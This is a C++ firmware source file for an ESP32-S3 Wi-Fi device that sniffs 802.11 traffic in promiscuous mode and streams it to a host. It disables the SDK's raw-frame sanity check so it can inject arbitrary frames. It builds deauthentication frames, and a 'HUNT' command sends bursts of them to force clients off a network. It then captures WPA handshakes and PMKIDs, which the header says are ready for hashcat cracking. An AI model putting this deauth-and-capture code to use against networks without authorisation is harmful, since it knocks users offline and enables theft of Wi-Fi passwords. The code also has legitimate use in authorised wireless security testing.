// ============================================================================
//  Motoko-S3  —  802.11 radio-pipe + capture firmware for the Newsheen puck
//  (Retia esp32_base_puck_v2, ESP32-S3 N16R2).  Port of the ESP8266 "Motoko v3"
//  bridge (skickar/motoko-bpi) to the ESP32-S3.
//
//  WIRE-COMPATIBLE with the existing Motoko display/host:
//    * SLIP framing (RFC1055), 1,000,000 baud over USB-CDC
//    * Board->host PKT_RECV (0x03) = [12-byte meta][raw 802.11 frame]
//        meta[0]  = RSSI (int8)            <- parser.js reads raw[1]
//        meta[10] = channel (low nibble)   <- parser.js reads raw[11]
//        frame starts at meta+12           <- parser.js reads raw[13..]
//    * Host->board 0x00 INJECT / 0x01 CH_SWITCH / 0x02 FILTER_SET / 0x05 STATUS_REQ
//    * Board->host 0x04 DEBUG_MSG (ascii)
//  So skickar/motoko-site, the browser Tactical HUD, and the Python lab all work
//  against this firmware with NO changes.  Everything below is ADDITIVE.
//
//  What the ESP32-S3 does that the ESP8266 physically CANNOT:
//    1. FULL-LENGTH capture. The ESP8266 promiscuous callback hard-caps mgmt
//       frames at ~112 bytes (SDK/ROM limit) so RSN/WPS and EAPOL key-data get
//       truncated. Here rx_ctrl.sig_len gives the WHOLE frame -> real RSN/WPS
//       parsing AND real WPA handshake / PMKID capture.
//    2. EAPOL / PMKID detection (TYPE_EAPOL 0x06): the whole 4-way handshake and
//       the RSN-PMKID KDE survive, so a host can write hashcat 22000 directly.
//    3. Arbitrary raw TX incl. deauth on a STOCK SDK, via the
//       ieee80211_raw_frame_sanity_check() override (the ESP8266 needed a
//       patched SDK blob; stock cores returned -1 and radiated nothing).
//    4. Active handshake trigger (TYPE_HUNT 0x07): park + deauth burst to force a
//       reassociation, then camp and capture -- a self-contained grab.
//  Additive types are IGNORED by the current display (it only parses 0x03), so
//  compatibility is preserved while new tooling can use them.
// ============================================================================
#include <Arduino.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "nvs_flash.h"
#include "freertos/FreeRTOS.h"
#include "freertos/ringbuf.h"
#include "motoko_proto.h"      // SLIP + type bytes + meta + EAPOL/PMKID inspect (shared w/ host tests)

#define FW_VERSION 4           // "Motoko v4" — S3 full-frame generation

// ---- pins (esp32_base_puck_v2) ----
#define DBG_LED 48             // plain LED (NOT behind the broken U5 shifter) — always works

void feed_cmd_byte(uint8_t c); // fwd (defined near loop)

// ============================================================================
//  HID transport (build env newsheen-motoko-hid, ARDUINO_USB_MODE=0 TinyUSB).
//  Presents a composite USB device: CDC (the same SLIP serial) + a vendor raw-HID
//  interface that mirrors the SLIP stream in 64-byte reports. This is the S3-only
//  path to a "HID display": WebHID runs on Android Chrome / mobile, where Web Serial
//  does NOT — so a phone/tablet HUD can read captures and send commands. The ESP8266
//  has no USB device controller at all, so it can never do this.
// ============================================================================
#if MOTOKO_HID
#include "USB.h"
#include "USBHID.h"
static USBHID HID;
static const uint8_t MOTOKO_HID_DESC[] = {
    0x06, 0x00, 0xFF,        // Usage Page (Vendor-Defined 0xFF00)
    0x09, 0x01,              // Usage (0x01)
    0xA1, 0x01,              // Collection (Application)
    0x15, 0x00,              //   Logical Minimum (0)
    0x26, 0xFF, 0x00,        //   Logical Maximum (255)
    0x75, 0x08,              //   Report Size (8)
    0x95, 0x40,              //   Report Count (64)
    0x09, 0x02,              //   Usage (0x02) — device->host capture stream
    0x81, 0x02,              //   Input (Data,Var,Abs)
    0x95, 0x40,              //   Report Count (64)
    0x09, 0x03,              //   Usage (0x03) — host->device commands
    0x91, 0x02,              //   Output (Data,Var,Abs)
    0xC0                     // End Collection
};
class MotokoRawHID : public USBHIDDevice {
  public:
    MotokoRawHID() { HID.addDevice(this, sizeof(MOTOKO_HID_DESC)); }
    void begin() { HID.begin(); }
    uint16_t _onGetDescriptor(uint8_t *dst) override {
        memcpy(dst, MOTOKO_HID_DESC, sizeof(MOTOKO_HID_DESC));
        return sizeof(MOTOKO_HID_DESC);
    }
    void _onOutput(uint8_t report_id, const uint8_t *buffer, uint16_t len) override {
        for (uint16_t i = 0; i < len; i++) feed_cmd_byte(buffer[i]);   // SLIP cmds over HID
    }
    bool send64(const uint8_t *r) { return HID.ready() && HID.SendReport(0, r, 64); }
};
static MotokoRawHID motokoHID;
// mirror an already-SLIP-encoded frame into 64-byte HID reports (pad with 0xC0 = harmless END)
static void hid_mirror(const uint8_t *data, uint32_t len) {
    uint8_t rep[64];
    for (uint32_t i = 0; i < len; ) {
        uint32_t n = (len - i > 64) ? 64 : (len - i);
        memcpy(rep, data + i, n);
        for (uint32_t j = n; j < 64; j++) rep[j] = SLIP_END;
        motokoHID.send64(rep);
        i += n;
    }
}
#endif // MOTOKO_HID

// ---- capture ----
static const int MAX_FRAME = 1600;              // cap per-frame copy
RingbufHandle_t g_rb = nullptr;                  // wifi-task -> loop, SPSC
static uint8_t  g_cbscratch[META_LEN + MAX_FRAME];  // only the (single) wifi task touches this

// ---- state ----
volatile uint8_t  g_filter = 0x01 | 0x04;        // mgmt+data by default (matches ESP8266)
volatile uint8_t  g_channel = 6;
uint32_t g_rx_count = 0, g_tx_count = 0, g_drops = 0;
uint32_t g_eapol_count = 0, g_pmkid_count = 0, g_hs_msgs = 0;
int      g_tx_last_err = 0;
volatile bool g_hop = false;

// LED event pulse (non-blocking)
volatile uint32_t g_led_off_at = 0;

// ---- serial rx (SLIP decode) ----
#define RX_BUFFER_SIZE 2600
static uint8_t rx_buffer[RX_BUFFER_SIZE];
static uint16_t rx_ptr = 0;
static bool rx_escaped = false;

// ============================================================================
//  Raw-TX enable: override the wifi lib's frame sanity check so esp_wifi_80211_tx
//  will radiate ARBITRARY frames (incl. deauth). Weak symbol in libnet80211.a.
// ============================================================================
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// ============================================================================
//  SLIP send — build the whole escaped frame into one buffer, single write.
//  (Per-byte Serial.write over USB-CDC is slow; one bulk write keeps up with RF.)
// ============================================================================
static uint8_t slipbuf[2 * (META_LEN + MAX_FRAME) + 4];
void slip_send(uint8_t type, const uint8_t *data, uint16_t len) {
    uint32_t o = motoko_slip_encode(type, data, len, slipbuf);
    Serial.write(slipbuf, o);
#if MOTOKO_HID
    hid_mirror(slipbuf, o);      // same stream to the WebHID display
#endif
}
void send_debug(const String &m) { slip_send(TYPE_DEBUG_MSG, (const uint8_t*)m.c_str(), m.length()); }

void send_status() {
    // Keep the literal "Motoko v4" so any host version-handshake regex still matches.
    send_debug("Motoko v" + String(FW_VERSION) + "-S3 (full-frame) STATUS"
               " ch=" + String(g_channel) +
               " filter=" + String(g_filter) +
               " rx=" + String(g_rx_count) +
               " tx=" + String(g_tx_count) + " txerr=" + String(g_tx_last_err) +
               " eapol=" + String(g_eapol_count) +
               " pmkid=" + String(g_pmkid_count) +
               " hsmsg=" + String(g_hs_msgs) +
               " drops=" + String(g_drops));
}

// ============================================================================
//  Promiscuous RX callback — runs in the WiFi task. Copy [meta][frame] into the
//  ring and return fast (no Serial I/O here — that would stall the WiFi stack).
// ============================================================================
void IRAM_ATTR promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
    int len = p->rx_ctrl.sig_len;                      // FULL frame incl FCS
    if (len < 12) return;
    if (len > MAX_FRAME) len = MAX_FRAME;
    uint8_t *m = g_cbscratch;
    motoko_build_meta(m, (int8_t)p->rx_ctrl.rssi, p->rx_ctrl.channel);
    memcpy(m + META_LEN, p->payload, len);
    // 0-timeout send; if the ring is full we drop (counted) rather than stall RF.
    if (xRingbufferSend(g_rb, m, META_LEN + len, 0) != pdTRUE) g_drops++;
}

// ============================================================================
//  Host command processing (SLIP-decoded)
// ============================================================================
void led_pulse(uint16_t ms) { digitalWrite(DBG_LED, HIGH); g_led_off_at = millis() + ms; }

void set_channel(uint8_t ch) {
    if (ch < 1 || ch > 14) return;
    g_channel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void inject(const uint8_t *frame, uint16_t len) {
    if (len < 10) return;
    int r = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    g_tx_count++;
    g_tx_last_err = r;
}

// minimal deauth builder: bssid -> dst (broadcast if client null)
void send_deauth(const uint8_t *bssid, const uint8_t *client) {
    uint8_t bc[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    const uint8_t *dst = client ? client : bc;
    uint8_t f[26];
    f[0]=0xC0; f[1]=0x00;               // deauth
    f[2]=0x00; f[3]=0x00;               // duration
    memcpy(f+4,  dst,   6);             // addr1 = dst
    memcpy(f+10, bssid, 6);             // addr2 = bssid (source)
    memcpy(f+16, bssid, 6);             // addr3 = bssid
    f[22]=0x00; f[23]=0x00;             // seq
    f[24]=0x07; f[25]=0x00;             // reason 7 (class-3 from nonassociated)
    inject(f, 26);
}

void process_command(uint8_t *buf, uint16_t len) {
    if (len < 1) return;
    uint8_t type = buf[0];
    uint8_t *pl = buf + 1;
    uint16_t pn = len - 1;
    switch (type) {
        case TYPE_PKT_INJECT: inject(pl, pn); break;
        case TYPE_CH_SWITCH:  if (pn >= 1) set_channel(pl[0]); break;
        case TYPE_FILTER_SET: if (pn >= 1) g_filter = pl[0]; break;
        case TYPE_STATUS_REQ: send_status(); break;
        case TYPE_HUNT: {                     // [ch][bssid6][client6?]
            if (pn >= 7) {
                set_channel(pl[0]);
                const uint8_t *bssid = pl + 1;
                const uint8_t *client = (pn >= 13) ? pl + 7 : nullptr;
                for (int i = 0; i < 8; i++) { send_deauth(bssid, client); delay(2); }
                led_pulse(200);
                send_debug("HUNT ch=" + String(pl[0]) + " deauth x8 sent; camping");
            }
            break;
        }
        case TYPE_HOP: g_hop = (pn >= 1 && pl[0] != 0); break;
    }
}

// ============================================================================
void wifi_start() {
    // A blank NVS (e.g. after esptool erase-all) returns NO_FREE_PAGES; if we proceed
    // the PHY/wifi init panics -> boot loop -> USB never enumerates. Erase+retry.
    esp_err_t nv = nvs_flash_init();
    if (nv == ESP_ERR_NVS_NO_FREE_PAGES || nv == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        nvs_flash_init();
    }
    esp_netif_init();
    esp_event_loop_create_default();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);           // STA iface backs esp_wifi_80211_tx
    esp_wifi_start();
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t f = { .filter_mask =
        WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL };
    esp_wifi_set_promiscuous_filter(&f);
    esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
    set_channel(g_channel);
}

void setup() {
    pinMode(DBG_LED, OUTPUT);
    digitalWrite(DBG_LED, LOW);
    Serial.begin(1000000);
#if MOTOKO_HID
    motokoHID.begin();
    USB.begin();
#endif
    g_rb = xRingbufferCreate(28 * 1024, RINGBUF_TYPE_NOSPLIT);
    wifi_start();
    // 3 quick blinks = alive
    for (int i = 0; i < 3; i++) { digitalWrite(DBG_LED,HIGH); delay(60); digitalWrite(DBG_LED,LOW); delay(90); }
    send_debug("Motoko v4-S3 (full-frame) ready  ch=" + String(g_channel));
}

uint32_t g_last_hop = 0;
uint8_t  g_hop_idx = 0;
const uint8_t HOP_CH[3] = {1, 6, 11};

// SLIP-decode one inbound byte (from USB-CDC or, in the HID build, an HID OUT report)
// and dispatch a full frame. Shared so both transports drive the same command path.
void feed_cmd_byte(uint8_t c) {
    if (c == SLIP_END) {
        if (rx_ptr > 0) { process_command(rx_buffer, rx_ptr); rx_ptr = 0; }
    } else if (c == SLIP_ESC) {
        rx_escaped = true;
    } else if (rx_escaped) {
        if (rx_ptr < RX_BUFFER_SIZE) {
            if (c == SLIP_ESC_END) rx_buffer[rx_ptr++] = SLIP_END;
            else if (c == SLIP_ESC_ESC) rx_buffer[rx_ptr++] = SLIP_ESC;
        }
        rx_escaped = false;
    } else {
        if (rx_ptr < RX_BUFFER_SIZE) rx_buffer[rx_ptr++] = c; else rx_ptr = 0;
    }
}

void loop() {
    // 1) drain serial -> SLIP decode -> commands
    while (Serial.available()) feed_cmd_byte(Serial.read());

    // 2) drain captured frames -> host
    size_t sz = 0;
    for (int budget = 0; budget < 64; budget++) {     // bounded per loop so serial stays responsive
        uint8_t *item = (uint8_t *)xRingbufferReceive(g_rb, &sz, 0);
        if (!item) break;
        g_rx_count++;
        const uint8_t *frame = item + META_LEN;
        int flen = (int)sz - META_LEN;
        uint8_t ftype = (frame[0] & 0x0C) >> 2;        // 0 mgmt / 1 ctrl / 2 data

        // EAPOL/PMKID always inspected (independent of host filter) -> 0x06 + LED
        int pmkid = 0;
        int msg = motoko_eapol_inspect(frame, flen, &pmkid);
        if (msg) {
            g_eapol_count++; g_hs_msgs++;
            if (pmkid) g_pmkid_count++;
            slip_send(TYPE_EAPOL, item, sz);
            led_pulse(120);
        }

        // host-facing software filter (matches ESP8266 semantics)
        bool pass = (ftype == 0 && (g_filter & 0x01)) ||
                    (ftype == 1 && (g_filter & 0x02)) ||
                    (ftype == 2 && (g_filter & 0x04));
        if (pass) slip_send(TYPE_PKT_RECV, item, sz);

        vRingbufferReturnItem(g_rb, item);
    }

    // 3) optional channel hop
    if (g_hop && millis() - g_last_hop > 250) {
        g_last_hop = millis();
        g_hop_idx = (g_hop_idx + 1) % 3;
        set_channel(HOP_CH[g_hop_idx]);
    }

    // 4) LED pulse expiry
    if (g_led_off_at && millis() >= g_led_off_at) { digitalWrite(DBG_LED, LOW); g_led_off_at = 0; }
}
